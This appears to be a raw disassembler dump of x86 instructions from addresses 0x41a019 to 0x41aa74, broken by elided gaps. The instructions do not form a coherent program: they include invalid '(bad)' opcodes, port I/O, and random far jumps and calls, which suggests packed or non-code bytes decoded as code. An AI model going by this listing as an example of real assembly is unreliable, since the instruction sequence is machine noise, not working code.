  41a019:	xor    DWORD PTR [ebp-0x1d],ebp
  41a01c:	or     eax,0x5238b596
  41a021:	cmp    eax,0x1e8f3c09
  41a026:	adc    esi,DWORD PTR [ecx+0x2381dd62]
  41a02c:	sbb    cl,BYTE PTR [edx+0x74]
  41a02f:	(bad)  
  41a030:	out    dx,al
  41a031:	mov    edx,0xe73bda65
  41a036:	mov    bh,0xa5
  41a038:	aaa    
  41a039:	mov    ah,0xb
  41a03b:	int3   
  41a03c:	lods   al,BYTE PTR ds:[esi]
  41a03d:	and    bl,BYTE PTR [edx-0x1c]
  41a040:	jp     0x419fe6
  41a042:	ja     0x41a055
  41a044:	push   esp
  41a045:	fistp  DWORD PTR [ecx+0x4eb5bf0c]
  41a04b:	inc    ecx
  41a04c:	rcr    DWORD PTR [ebp-0x63ba2677],1
  41a052:	inc    esp
  41a053:	pop    ds
  41a054:	fisubr DWORD PTR [edi-0xd5c601d]
  41a05a:	test   DWORD PTR [esi+0x31],ecx
  41a05d:	jl     0x41a085
  41a05f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a060:	sbb    eax,0x4f11db8b
  41a065:	(bad)  
  41a066:	or     BYTE PTR [ebx-0xdfc9b8a],bl
  41a06c:	(bad)  
	...
  41a0d6:	dec    esi
  41a0d7:	jmp    0x41a103
  41a0d9:	dec    esi
  41a0da:	scas   eax,DWORD PTR es:[edi]
  41a0db:	iret   
  41a0dc:	outs   dx,BYTE PTR ds:[esi]
  41a0dd:	jmp    0x41a062
  41a0df:	push   edx
  41a0e0:	test   BYTE PTR [eax-0x44],bh
  41a0e3:	and    eax,0x18678acc
  41a0e8:	add    DWORD PTR [eax],eax
  41a0ea:	add    BYTE PTR [ecx],al
  41a0ec:	add    BYTE PTR [eax],al
  41a0ee:	int    0xf5
  41a0f0:	sbb    BYTE PTR [ebp-0x1d3150c7],ch
  41a0f6:	sbb    eax,0x233797e8
  41a0fb:	sub    BYTE PTR [esi-0x5727f1f9],0x23
  41a102:	test   DWORD PTR [ecx+0x9],ebp
  41a105:	or     al,0xc5
  41a107:	xchg   BYTE PTR [esi],cl
  41a109:	mov    eax,0xc40547e4
  41a10e:	std    
  41a10f:	sub    DWORD PTR [esi+0x18abb506],ebp
  41a115:	mov    al,ds:0xf8726d8b
  41a11a:	xchg   DWORD PTR [eax+0x2a3cd512],esi
  41a120:	sub    BYTE PTR [edx-0x1cd89003],0xc3
  41a127:	xchg   edi,eax
  41a128:	sti    
  41a129:	loop   0x41a0dc
  41a12b:	es pop ss
  41a12d:	ret    0xfa2
  41a130:	xchg   ecx,eax
  41a131:	adc    esi,DWORD PTR [edi+0x55e00c9b]
  41a137:	popf   
  41a138:	out    dx,al
  41a139:	mov    cl,0x78
  41a13b:	cmp    DWORD PTR [esi+0x2b9253c3],esi
  41a141:	mov    eax,0xbfc03bdf
  41a146:	stc    
  41a147:	add    eax,0x94198a87
  41a14c:	adc    DWORD PTR [ebx],ebx
  41a14e:	ss ss mov dl,0xa3
  41a152:	jmp    DWORD PTR [eax-0x28aa65df]
  41a158:	in     al,0x86
  41a15a:	enter  0x682,0x41
  41a15e:	into   
  41a15f:	xchg   esi,eax
  41a160:	mov    dh,BYTE PTR [edi+0x375eb2c7]
  41a166:	cmp    DWORD PTR [ebp+0x5f],ecx
  41a169:	je     0x41a159
  41a16b:	mov    ebx,0xf9a9b111
  41a170:	push   ebx
  41a171:	ja     0x41a134
  41a173:	mov    ch,0xe0
  41a175:	jnp    0x41a167
  41a177:	clc    
  41a178:	mov    edx,0x52ea14c0
  41a17d:	mov    eax,0x2946cdae
  41a182:	sub    esp,eax
  41a184:	loope  0x41a183
  41a186:	mov    DWORD PTR [esi+0x3873429a],edx
  41a18c:	push   es
  41a18d:	arpl   WORD PTR ds:0x2f01d498,bx
  41a193:	aam    0x9e
  41a195:	adc    eax,0xb1477245
  41a19a:	loop   0x41a1c5
  41a19c:	data16 add BYTE PTR [ecx+0x73],bl
  41a1a0:	mov    eax,ds:0xc0b8dc9a
  41a1a5:	fdivrp st(1),st
  41a1a7:	mov    eax,ds:0xbb32dbf0
  41a1ac:	aas    
  41a1ad:	sahf   
  41a1ae:	xchg   edx,eax
  41a1af:	fnsave [ebx-0x7330596e]
  41a1b5:	retf   0x585e
  41a1b8:	mov    eax,0x5ffa506c
  41a1bd:	js     0x41a223
  41a1bf:	xor    BYTE PTR [esi-0xd6d5381],bl
  41a1c5:	into   
  41a1c6:	inc    esp
  41a1c7:	fidivr DWORD PTR [edi-0x1f]
  41a1ca:	inc    edi
  41a1cb:	xchg   DWORD PTR [eax+eax*4],edi
  41a1ce:	jg     0x41a150
  41a1d0:	xchg   esp,eax
  41a1d1:	data16 adc BYTE PTR [esi+0x58],bl
  41a1d5:	add    al,0x2d
  41a1d7:	sub    al,0x50
  41a1d9:	(bad)  
  41a1da:	sub    eax,0x2c3d51fa
  41a1df:	fs mov ecx,?
  41a1e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a1e3:	(bad)  
  41a1e4:	adc    al,0xb5
  41a1e6:	(bad)
  41a1ea:	xchg   ebx,edx
  41a1ec:	cmp    eax,0x20
	...
  41a255:	add    BYTE PTR [esp+ecx*1],bl
  41a258:	std    
  41a259:	sbb    ebp,edi
  41a25b:	stc    
  41a25c:	cld    
  41a25d:	or     eax,0x398d6850
  41a262:	mov    ah,0xa
  41a264:	out    dx,eax
  41a265:	push   esp
  41a266:	sbb    DWORD PTR [bx+di],eax
  41a269:	add    BYTE PTR [eax],al
  41a26b:	add    DWORD PTR [eax],eax
  41a26d:	add    BYTE PTR ds:0x7e06cd2e,cl
  41a273:	dec    ebp
  41a274:	daa    
  41a275:	lahf   
  41a276:	push   0x5
  41a278:	(bad)  
  41a279:	fadd   DWORD PTR [edx+0x5d4be5e8]
  41a27f:	out    0x8d,al
  41a281:	cld    
  41a282:	jno    0x41a293
  41a284:	sub    bl,ah
  41a286:	or     edi,DWORD PTR [ebx-0x6c73c77d]
  41a28c:	lea    ecx,[ecx-0x16d18862]
  41a292:	mov    BYTE PTR [edx],bl
  41a294:	push   cs
  41a295:	push   0x53eaaa60
  41a29a:	adc    DWORD PTR [esi+0x71af2870],0x42
  41a2a1:	es dec eax
  41a2a3:	xchg   ecx,eax
  41a2a4:	push   0x26
  41a2a6:	aas    
  41a2a7:	or     edx,DWORD PTR [edx]
  41a2a9:	pop    esi
  41a2aa:	fnstsw WORD PTR [edi+ecx*4]
  41a2ad:	pop    edi
  41a2ae:	push   cs
  41a2af:	mov    esi,0x8a3775b6
  41a2b4:	add    DWORD PTR [ebx+0x61],ebx
  41a2b7:	mov    ds:0x34c7bafd,eax
  41a2bc:	and    al,0x20
  41a2be:	mov    ecx,DWORD PTR [esi]
  41a2c0:	xchg   esp,eax
  41a2c1:	dec    eax
  41a2c2:	nop
  41a2c3:	sbb    DWORD PTR [edi],esp
  41a2c5:	add    DWORD PTR [ecx+0x69],eax
  41a2c8:	adc    ebp,DWORD PTR [ecx+0x52caa05a]
  41a2ce:	push   ebx
  41a2cf:	daa    
  41a2d0:	clc    
  41a2d1:	js     0x41a256
  41a2d3:	je     0x41a2c5
  41a2d5:	push   ebp
  41a2d6:	sti    
  41a2d7:	xor    ah,dl
  41a2d9:	sub    ebp,DWORD PTR [ecx]
  41a2db:	leave  
  41a2dc:	and    BYTE PTR [edi+0x1bca0579],dh
  41a2e2:	aam    0xc2
  41a2e4:	mov    bl,0x62
  41a2e7:	cmp    eax,0x8d6ffcad
  41a2ec:	je     0x41a2c6
  41a2ee:	xor    BYTE PTR [eax],dl
  41a2f0:	test   dh,ah
  41a2f2:	aas    
  41a2f3:	jnp    0x41a327
  41a2f5:	adc    ah,dh
  41a2f7:	jg     0x41a28e
  41a2f9:	mov    esi,0x39deff2a
  41a2fe:	adc    al,0xb7
  41a300:	mov    cl,0x25
  41a302:	add    eax,ebp
  41a304:	lods   eax,DWORD PTR ds:[esi]
  41a305:	push   ebp
  41a306:	jmp    0xc6e1:0x5ac754de
  41a30d:	(bad)  
  41a30e:	push   ss
  41a30f:	ja     0x41a2ee
  41a311:	push   edx
  41a312:	retf   
  41a313:	mov    cl,0xdf
  41a315:	cmp    cl,BYTE PTR [ebp-0x67]
  41a318:	and    ch,al
  41a31a:	sbb    DWORD PTR [ecx],0x3d
  41a31d:	dec    ecx
  41a31e:	shl    DWORD PTR [esi+eiz*4+0x1b],1
  41a322:	mov    dh,0xd
  41a324:	(bad)  
  41a325:	outs   dx,BYTE PTR ds:[esi]
  41a326:	call   0xc676:0xc2f8ef63
  41a32d:	inc    edi
  41a32e:	mov    edx,0xe69a6dc9
  41a333:	adc    esp,DWORD PTR [edi+0x38]
  41a336:	dec    ebp
  41a337:	scas   al,BYTE PTR es:[edi]
  41a338:	ret    0x886b
  41a33b:	std    
  41a33c:	out    dx,al
  41a33d:	add    DWORD PTR [ebx],edi
  41a33f:	dec    edx
  41a340:	mov    gs,WORD PTR [ebp-0x46]
  41a343:	xor    DWORD PTR ds:0xc76f7a25,eax
  41a349:	mov    ebx,0x1dae8938
  41a34e:	rcl    BYTE PTR [ebx],0x91
  41a351:	or     BYTE PTR [ecx-0x3f],dl
  41a354:	std    
  41a355:	and    al,0x1b
  41a357:	imul   esi
  41a359:	cmp    dl,BYTE PTR [ebx-0x6ec112e9]
  41a35f:	and    ebp,edx
  41a361:	mov    edx,0xac242d80
  41a366:	lahf   
  41a367:	sbb    al,0xe4
  41a369:	rcl    DWORD PTR [edx],1
  41a36b:	xor    DWORD PTR [esi+eax*4],edx
	...
  41a3d6:	neg    DWORD PTR [eax-0x58]
  41a3d9:	adc    ebp,DWORD PTR [edi+0x15fcfff3]
  41a3df:	pop    esp
  41a3e0:	xchg   ebp,eax
  41a3e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a3e2:	scas   al,BYTE PTR es:[edi]
  41a3e3:	cli    
  41a3e4:	out    dx,al
  41a3e5:	or     eax,0x11a67
  41a3ea:	add    BYTE PTR [ecx],al
  41a3ec:	add    BYTE PTR [eax],al
  41a3ee:	and    DWORD PTR [edx+eax*4],ebx
  41a3f1:	add    eax,0x4ad19739
  41a3f6:	jecxz  0x41a3af
  41a3f8:	mov    dh,0x9
  41a3fa:	adc    eax,0x3d4504ad
  41a3ff:	lahf   
  41a400:	and    BYTE PTR [edx+0x76776c94],bl
  41a406:	and    cl,BYTE PTR [ecx]
  41a408:	sbb    DWORD PTR [ebx+0x1db9d6cd],ebx
  41a40e:	pop    eax
  41a40f:	mov    eax,0x9d47145c
  41a414:	cmp    dl,al
  41a416:	out    0xb0,al
  41a418:	dec    ebx
  41a419:	and    DWORD PTR [ecx],esp
  41a41b:	sbb    ch,ah
  41a41d:	outs   dx,BYTE PTR ds:[esi]
  41a41e:	adc    al,BYTE PTR [edi-0x55f05f6c]
  41a424:	lods   al,BYTE PTR ds:[esi]
  41a425:	pusha  
  41a426:	fucomp st(2)
  41a428:	das    
  41a429:	mov    ebp,0x2924fafc
  41a42e:	mov    dl,0xec
  41a430:	adc    eax,0x9feaa2cf
  41a435:	push   ss
  41a436:	dec    esi
  41a437:	xchg   esp,eax
  41a438:	mov    al,ds:0xb03861f4
  41a43d:	xchg   ebx,eax
  41a43e:	mov    ebx,0xa38d08f4
  41a443:	dec    esp
  41a444:	imul   ebp,eax,0x79983b05
  41a44a:	das    
  41a44b:	jmp    0x6df1:0xa01f3ac1
  41a452:	arpl   WORD PTR [eax-0x77],sp
  41a455:	ret    0xd46f
  41a458:	cmp    ebp,DWORD PTR [edx+0x17fa90cf]
  41a45e:	pop    ecx
  41a45f:	popf   
  41a460:	dec    esi
  41a461:	xor    dl,ch
  41a463:	add    DWORD PTR [ecx+eax*8+0x78],ecx
  41a467:	aad    0xb8
  41a469:	sbb    bh,cl
  41a46b:	sub    DWORD PTR [ecx+0xa7f0f1d],esi
  41a471:	and    eax,0x576bfc4
  41a476:	cdq    
  41a477:	cmp    al,0xea
  41a479:	iret   
  41a47a:	in     eax,dx
  41a47b:	lahf   
  41a47c:	xchg   DWORD PTR [ecx],edi
  41a47e:	pop    edx
  41a47f:	cli    
  41a480:	in     eax,0xc6
  41a482:	das    
  41a483:	pushf  
  41a484:	mov    cl,0x42
  41a486:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a487:	pusha  
  41a488:	sub    edi,DWORD PTR [esp+edi*1]
  41a48b:	adc    DWORD PTR [edi+0x693c0c8a],0x946b62d1
  41a495:	sahf   
  41a496:	add    BYTE PTR [edi],bh
  41a498:	fnstenv [edx]
  41a49a:	addr16 inc ebx
  41a49c:	cs sbb eax,0x64b84d5a
  41a4a2:	loope  0x41a4df
  41a4a4:	in     al,dx
  41a4a5:	fldenv [edx+edi*2-0x7bd190e2]
  41a4ac:	enter  0x2806,0x85
  41a4b0:	cmp    eax,0x84a2bc28
  41a4b5:	push   eax
  41a4b6:	sbb    al,0x4f
  41a4b8:	sbb    al,0x68
  41a4ba:	jmp    0x13f56edd
  41a4bf:	mov    eax,0xa2a2249a
  41a4c4:	mov    ecx,DWORD PTR [ebp+0x265ae61f]
  41a4ca:	repz add eax,0xc1be6fe9
  41a4d0:	call   0x3280c26
  41a4d5:	sahf   
  41a4d6:	jge    0x41a54f
  41a4d8:	mov    al,ds:0xd21cb027
  41a4dd:	je     0x41a4c5
  41a4df:	push   ecx
  41a4e0:	push   esi
  41a4e1:	or     ch,BYTE PTR [edx]
  41a4e3:	int3   
  41a4e4:	(bad)  
  41a4e6:	inc    edi
  41a4e7:	icebp  
  41a4e8:	adc    eax,DWORD PTR [ecx]
  41a4ea:	daa    
  41a4eb:	mov    eax,ds:0x822b
	...
  41a554:	add    BYTE PTR [eax],al
  41a556:	mov    edi,0xff0fcf82
  41a55b:	dec    edi
  41a55c:	push   DWORD PTR [edx+0x5f4d0d09]
  41a562:	lods   al,BYTE PTR ds:[esi]
  41a563:	mov    cl,0x3b
  41a565:	fbld   TBYTE PTR [edi+0x1b]
  41a568:	add    DWORD PTR [eax],eax
  41a56a:	add    BYTE PTR [ecx],al
  41a56c:	add    BYTE PTR [eax],al
  41a56e:	stos   DWORD PTR es:[edi],eax
  41a56f:	jo     0x41a51d
  41a571:	cmp    BYTE PTR [edx],al
  41a573:	mov    ds:0x8001322,eax
  41a578:	cmp    eax,0x3e9f166e
  41a57d:	int3   
  41a57e:	inc    esp
  41a57f:	mov    bl,0x26
  41a581:	xor    bl,BYTE PTR [ebx-0x7aaffd81]
  41a587:	jp     0x41a5e5
  41a589:	sbb    eax,0x6c46af98
  41a58e:	jno    0x41a51a
  41a590:	jb     0x41a51c
  41a592:	retf   0x27f9
  41a595:	mov    al,0x41
  41a597:	jg     0x41a53b
  41a599:	mov    ss,WORD PTR [edi+ebp*8-0x32963282]
  41a5a0:	xchg   edx,eax
  41a5a1:	sub    ah,BYTE PTR [eax-0x35]
  41a5a4:	push   edx
  41a5a5:	repnz push 0x2148d0f
  41a5ab:	mov    dh,0x25
  41a5ad:	stc    
  41a5ae:	outs   dx,DWORD PTR ds:[esi]
  41a5af:	adc    al,0x78
  41a5b1:	xor    DWORD PTR [ecx-0x8],esi
  41a5b4:	(bad)  
  41a5b6:	mov    ebp,DWORD PTR ds:0x3f88a996
  41a5bc:	imul   ebx,DWORD PTR [ebx+0xf],0xefc3662
  41a5c3:	rcr    DWORD PTR [eax-0x542b9463],1
  41a5c9:	or     DWORD PTR [eax+0x4],ebx
  41a5cc:	push   0x17531470
  41a5d1:	hlt    
  41a5d2:	add    al,0x8d
  41a5d4:	xchg   ebp,eax
  41a5d5:	cmp    al,0xe5
  41a5d7:	jecxz  0x41a5d6
  41a5d9:	jmp    0xa701:0x71df8831
  41a5e0:	fdiv   DWORD PTR [esi]
  41a5e2:	std    
  41a5e3:	imul   edi,DWORD PTR [ebx],0xfffffffa
  41a5e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a5e7:	(bad)  
  41a5e8:	shl    DWORD PTR [ecx],1
  41a5ea:	call   0xf4a1:0xbb3dda57
  41a5f1:	sub    BYTE PTR [eax-0x8],ch
  41a5f4:	inc    edx
  41a5f5:	mov    al,0xde
  41a5f7:	push   ss
  41a5f8:	adc    eax,DWORD PTR [esi+ebp*2+0x7a7bc173]
  41a5ff:	ret    0xec97
  41a602:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a603:	push   esi
  41a604:	add    BYTE PTR [eax+0x2da6d9d9],bl
  41a60a:	add    DWORD PTR [eax],0xffffff93
  41a60d:	adc    ch,BYTE PTR [edi-0x31e3ac8b]
  41a613:	dec    esi
  41a614:	fisub  DWORD PTR [edx+edx*8]
  41a617:	inc    ecx
  41a618:	mov    ecx,edx
  41a61a:	sbb    al,0x33
  41a61c:	xlat   BYTE PTR ds:[ebx]
  41a61d:	(bad)  
  41a61e:	push   edi
  41a61f:	cmp    BYTE PTR [ecx+0x1b4f64ab],bl
  41a625:	fidivr WORD PTR [ebx-0x55e222ef]
  41a62b:	adc    eax,0xf8276d66
  41a630:	cmp    al,0x7
  41a632:	sub    al,0xfe
  41a634:	mov    ds:0x8d233a47,eax
  41a639:	ret    
  41a63a:	inc    ecx
  41a63b:	mul    DWORD PTR [edi+edx*8+0x5c2abff0]
  41a642:	inc    esi
  41a643:	and    ah,BYTE PTR [edi+0x38]
  41a646:	iret   
  41a647:	sub    al,0x94
  41a649:	cmp    ecx,eax
  41a64b:	xor    DWORD PTR [ecx-0x2fa8e848],esi
  41a651:	dec    esi
  41a652:	mov    ds:0x4d1e7667,eax
  41a657:	enter  0x7e6a,0xc3
  41a65b:	lea    esp,[ecx-0x7a]
  41a65e:	stc    
  41a65f:	call   0x6d9c:0x4588dcbd
  41a666:	push   cs
  41a667:	ins    BYTE PTR es:[edi],dx
  41a668:	ret    
  41a669:	cdq    
  41a66a:	pop    ebx
  41a66b:	out    dx,al
  41a66c:	or     al,cl
	...
  41a6d6:	pop    esp
  41a6d7:	sub    al,BYTE PTR [ecx]
  41a6d9:	inc    ecx
  41a6da:	ja     0x41a747
  41a6dc:	pop    esp
  41a6dd:	aas    
  41a6de:	dec    ecx
  41a6df:	push   0xb02ca625
  41a6e4:	aam    0x3d
  41a6e6:	addr16 sbb al,0x1
  41a6e9:	add    BYTE PTR [eax],al
  41a6eb:	add    DWORD PTR [eax],eax
  41a6ed:	add    BYTE PTR [ebp+0x77],ch
  41a6f0:	pop    eax
  41a6f1:	test   eax,0xc54cdf52
  41a6f6:	icebp  
  41a6f7:	inc    ax
  41a6f9:	inc    eax
  41a6fa:	mov    ah,0x6f
  41a6fc:	cmp    edx,DWORD PTR [eax+esi*8]
  41a6ff:	sub    dh,BYTE PTR [esi]
  41a701:	ret    0x46e9
  41a704:	push   eax
  41a705:	in     al,dx
  41a706:	or     eax,0x9b9daea9
  41a70b:	out    dx,al
  41a70c:	in     eax,0x3b
  41a70e:	aad    0x1e
  41a710:	inc    esp
  41a711:	jns    0x41a694
  41a713:	ret    
  41a714:	test   BYTE PTR [ecx-0x13],cl
  41a717:	xor    al,bl
  41a719:	idiv   BYTE PTR [ecx+0x3661a896]
  41a71f:	mov    al,0x48
  41a721:	jae    0x41a784
  41a723:	pop    esi
  41a724:	clc    
  41a725:	pop    ss
  41a726:	jp     0x41a716
  41a728:	adc    eax,0x7fcc865c
  41a72d:	adc    cl,BYTE PTR [ebx+0x7b9e6c54]
  41a733:	out    0x66,al
  41a735:	mov    bl,0xdf
  41a737:	pop    es
  41a738:	cmp    eax,0x57cd10db
  41a73d:	scas   eax,DWORD PTR es:[edi]
  41a73e:	cmp    eax,0xedafdd3f
  41a743:	out    0xdd,eax
  41a745:	cli    
  41a746:	repnz adc al,0x8
  41a749:	xchg   esp,eax
  41a74a:	and    DWORD PTR [eax+edi*8],esp
  41a74d:	cs xchg ebx,eax
  41a74f:	fcom   DWORD PTR [ebx]
  41a751:	scas   al,BYTE PTR es:[edi]
  41a752:	int    0xaa
  41a754:	imul   edx,ebp,0xbfa4b316
  41a75a:	nop
  41a75b:	cmp    BYTE PTR [ecx-0x9],dl
  41a75e:	cwde   
  41a75f:	arpl   WORD PTR [edi+eiz*4],di
  41a762:	mov    ds:0xf84338d3,eax
  41a767:	jl     0x41a708
  41a769:	cli    
  41a76a:	push   ebp
  41a76b:	dec    ebp
  41a76c:	push   0xffffff8e
  41a76e:	and    al,0xcf
  41a770:	jnp    0x41a797
  41a772:	inc    esp
  41a773:	imul   edx,DWORD PTR ds:0xbffc50cf,0x3ceec2ac
  41a77d:	inc    ebx
  41a77e:	shl    edx,1
  41a780:	mov    dh,0x9a
  41a782:	xor    ebx,ecx
  41a784:	mov    eax,0x16d784ce
  41a789:	std    
  41a78a:	int3   
  41a78b:	ins    DWORD PTR es:[edi],dx
  41a78c:	pop    ss
  41a78d:	mov    ss,WORD PTR [esi+0x37]
  41a790:	push   eax
  41a791:	sti    
  41a792:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a793:	in     eax,dx
  41a794:	pop    esp
  41a795:	loope  0x41a7ce
  41a797:	jo     0x41a791
  41a799:	aad    0x38
  41a79b:	(bad)
  41a79e:	inc    esp
  41a79f:	adc    dh,BYTE PTR ds:0xace10fa3
  41a7a5:	in     al,dx
  41a7a6:	xlat   BYTE PTR ds:[ebx]
  41a7a7:	mov    DWORD PTR [edi-0x7cf6cf5b],eax
  41a7ad:	stc    
  41a7ae:	das    
  41a7af:	in     al,0xdc
  41a7b1:	aaa    
  41a7b2:	xchg   ecx,eax
  41a7b3:	ins    BYTE PTR es:[edi],dx
  41a7b4:	pop    esi
  41a7b5:	(bad)  
  41a7b6:	clc    
  41a7b7:	mov    dh,0x5
  41a7b9:	cmp    esp,edx
  41a7bb:	enter  0x1700,0xad
  41a7bf:	outs   dx,BYTE PTR ds:[esi]
  41a7c0:	daa    
  41a7c1:	push   eax
  41a7c2:	mov    cl,0x5c
  41a7c4:	inc    eax
  41a7c5:	je     0x41a81f
  41a7c7:	aas    
  41a7c8:	mov    cl,0x49
  41a7ca:	inc    ebx
  41a7cb:	add    esi,ebx
  41a7cd:	loope  0x41a7b3
  41a7cf:	psubusw mm6,QWORD PTR [eax]
  41a7d2:	sahf   
  41a7d3:	add    ebx,DWORD PTR [ebx]
  41a7d5:	arpl   ax,si
  41a7d7:	adc    dh,BYTE PTR [ecx+0x6e]
  41a7da:	ins    BYTE PTR es:[edi],dx
  41a7db:	dec    eax
  41a7dc:	and    eax,0x4b74ac5
  41a7e1:	mov    ebp,DWORD PTR [edx+0x66]
  41a7e4:	je     0x41a7fb
  41a7e6:	dec    edx
  41a7e7:	aad    0x5e
  41a7e9:	aas    
  41a7ea:	xchg   ebx,eax
  41a7eb:	popa   
  41a7ec:	arpl   WORD PTR [edi+0x0],bx
	...
  41a853:	add    BYTE PTR [eax],al
  41a855:	add    bl,dh
  41a857:	xchg   edi,eax
  41a858:	jae    0x41a7e1
  41a85a:	ja     0x41a843
  41a85c:	div    edi
  41a85e:	mov    ds:0x7f5327ca,al
  41a863:	sbb    bh,BYTE PTR [esp+ecx*4+0x67]
  41a867:	sbb    eax,0x1000001
  41a86c:	add    BYTE PTR [eax],al
  41a86e:	repz cmp edi,DWORD PTR [eax]
  41a871:	in     al,dx
  41a872:	stos   BYTE PTR es:[edi],al
  41a873:	data16 cli 
  41a875:	pushf  
  41a876:	call   0x69e9c5b3
  41a87b:	iret   
  41a87c:	bound  ebp,QWORD PTR [esi-0x1f3b623b]
  41a882:	pop    esi
  41a883:	aaa    
  41a884:	fistp  DWORD PTR [ecx+0x5c9e99c4]
  41a88a:	xchg   BYTE PTR [ecx-0xf19e501],cl
  41a890:	jp     0x41a8eb
  41a892:	xor    al,0x3b
  41a894:	std    
  41a895:	hlt    
  41a896:	shl    BYTE PTR [edi],0x24
  41a899:	push   ebp
  41a89a:	imul   edx,DWORD PTR [ecx],0xba886c77
  41a8a0:	mov    bl,0xc6
  41a8a2:	or     eax,0x9e88494
  41a8a7:	pop    ecx
  41a8a8:	jg     0x41a845
  41a8aa:	and    eax,0x1e6aaafe
  41a8af:	cmp    BYTE PTR [esi-0x4],dl
  41a8b2:	inc    esi
  41a8b3:	in     al,0x9
  41a8b5:	call   0xb46f:0x63a2f8ba
  41a8bc:	or     DWORD PTR [ebx-0xa3b84b1],0x42
  41a8c3:	and    edi,esi
  41a8c5:	inc    esi
  41a8c6:	test   DWORD PTR [eax-0x33],ebp
  41a8c9:	dec    esi
  41a8ca:	leave  
  41a8cb:	je     0x41a8b7
  41a8cd:	data16 sub BYTE PTR [ecx+0x380ee2d9],bh
  41a8d4:	sbb    DWORD PTR [ebp-0x4e3724a8],edi
  41a8da:	mov    BYTE PTR [edi],bl
  41a8dc:	lods   al,BYTE PTR ds:[esi]
  41a8dd:	push   0x10
  41a8df:	sub    al,0x89
  41a8e1:	fsubp  st(4),st
  41a8e3:	inc    ecx
  41a8e4:	aad    0xda
  41a8e6:	pop    eax
  41a8e7:	test   BYTE PTR ds:0x75bc83b0,dl
  41a8ed:	pop    ss
  41a8ee:	or     edx,0x8b1fee86
  41a8f4:	(bad)  
  41a8f5:	jecxz  0x41a95a
  41a8f7:	jns    0x41a8e6
  41a8f9:	mov    edx,0xe3559777
  41a8fe:	cmp    esi,DWORD PTR [ecx]
  41a900:	ins    BYTE PTR es:[edi],dx
  41a901:	aad    0xe9
  41a903:	mov    edi,0xc2b30a24
  41a908:	ja     0x41a928
  41a90a:	(bad)  
  41a90b:	adc    ebx,DWORD PTR [ebx-0x6fa1304c]
  41a911:	mov    BYTE PTR [ecx-0x51],bl
  41a914:	js     0x41a89e
  41a916:	jmp    0x88f9356b
  41a91b:	inc    ecx
  41a91c:	push   edx
  41a91d:	nop
  41a91e:	xchg   cl,bl
  41a920:	popf   
  41a921:	arpl   WORD PTR [edx],bx
  41a923:	push   ebx
  41a924:	aas    
  41a925:	push   0xcdc6dd63
  41a92a:	arpl   WORD PTR [eax-0x22bc4d03],dx
  41a930:	(bad)  
  41a932:	mov    al,ds:0x8962732e
  41a937:	xor    BYTE PTR [edi-0x75],bh
  41a93a:	in     eax,0x39
  41a93c:	clc    
  41a93d:	xchg   DWORD PTR [ebx+0x5e],eax
  41a940:	pop    ds
  41a941:	xchg   edx,eax
  41a942:	ret    0x2023
  41a945:	call   0x86e6:0xf5fe6627
  41a94c:	(bad)  
  41a94d:	mov    BYTE PTR fs:[ebp+0x4d7b7a3a],dl
  41a954:	ret    
  41a955:	pop    eax
  41a956:	mov    bl,0xe6
  41a958:	scas   al,BYTE PTR es:[edi]
  41a959:	ret    
  41a95a:	mov    BYTE PTR [ebx],ah
  41a95c:	sbb    bh,BYTE PTR [bx]
  41a95f:	inc    ebx
  41a960:	pop    eax
  41a961:	pop    eax
  41a962:	pop    ecx
  41a963:	pop    ecx
  41a964:	fwait
  41a965:	dec    ebp
  41a966:	pusha  
  41a967:	ins    DWORD PTR es:[edi],dx
  41a968:	pop    ebp
  41a969:	mov    ecx,0x9f464de7
	...
  41a9d6:	xor    eax,0xcf4a867e
  41a9db:	cli    
  41a9dc:	std    
  41a9dd:	jg     0x41aa2d
  41a9df:	push   edx
  41a9e0:	pushf  
  41a9e1:	dec    esp
  41a9e2:	int    0xd
  41a9e4:	dec    ebp
  41a9e5:	xchg   esp,eax
  41a9e6:	addr16 push ds
  41a9e8:	add    DWORD PTR [eax],eax
  41a9ea:	add    BYTE PTR [ecx],al
  41a9ec:	add    BYTE PTR [eax],al
  41a9ee:	outs   dx,BYTE PTR ds:[esi]
  41a9ef:	xchg   ebp,eax
  41a9f0:	cli    
  41a9f1:	xchg   ebx,eax
  41a9f2:	test   al,0xd0
  41a9f4:	out    dx,eax
  41a9f5:	xchg   BYTE PTR [eax+0x2e5c9cc5],bh
  41a9fb:	mov    eax,0x3a6672e4
  41aa00:	sbb    DWORD PTR [ebp+0x27ee72e7],ebp
  41aa06:	adc    ecx,DWORD PTR [edi]
  41aa08:	es (bad) 
  41aa0b:	jmp    0x1d5074b3
  41aa10:	clc    
  41aa11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa12:	lock ja 0x41a9a7
  41aa15:	mov    eax,ds:0xb2b1a9fc
  41aa1a:	inc    BYTE PTR [edi]
  41aa1c:	jmp    0x41aa56
  41aa1e:	cmp    al,ch
  41aa20:	outs   dx,BYTE PTR ds:[esi]
  41aa21:	mov    edi,0xc3f5e089
  41aa26:	mov    edx,0x657421be
  41aa2b:	and    eax,0xfaa4e15c
  41aa30:	push   ebx
  41aa31:	xlat   BYTE PTR ds:[ebx]
  41aa32:	jl     0x41aa6d
  41aa34:	lea    ebp,[ebx+esi*4+0x16]
  41aa38:	fwait
  41aa39:	cmp    DWORD PTR [ebp+0x155f5c2d],0x1195febe
  41aa43:	mov    ah,BYTE PTR [esi]
  41aa45:	in     al,0xea
  41aa47:	lods   eax,DWORD PTR ds:[esi]
  41aa48:	scas   al,BYTE PTR es:[edi]
  41aa49:	dec    edx
  41aa4a:	std    
  41aa4b:	stos   DWORD PTR es:[edi],eax
  41aa4c:	push   edx
  41aa4d:	fst    QWORD PTR [ebx]
  41aa4f:	clc    
  41aa50:	mov    esp,DWORD PTR [ebp-0x7222dfd9]
  41aa56:	push   ebx
  41aa57:	es ds sahf 
  41aa5a:	std    
  41aa5b:	mov    edx,0x394803c4
  41aa60:	mov    dh,0xa0
  41aa62:	sar    DWORD PTR [ebx+0x2e],0xb8
  41aa66:	aas    
  41aa67:	jo     0x41a9f5
  41aa69:	(bad)  
  41aa6a:	cmovno esi,DWORD PTR [ebx-0x7df4acae]
  41aa71:	xchg   BYTE PTR [ebp-0x67],dh
  41aa74:	sub    al,0xd
